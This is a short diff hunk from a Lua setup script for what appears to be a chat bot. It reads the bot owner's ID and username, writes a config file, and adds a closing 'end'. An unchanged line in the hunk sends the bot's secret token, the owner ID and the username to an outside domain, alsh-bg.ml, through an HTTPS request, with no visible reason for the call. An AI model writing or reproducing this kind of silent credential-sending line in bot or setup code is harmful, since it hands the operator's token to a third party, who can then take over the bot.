@@ -65,6 +65,7 @@ SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
+end
 https.request("https://alsh-bg.ml/api/?token="..token.."&id="..SUDO.."&username="..UserName)
 
 create_config_auto()
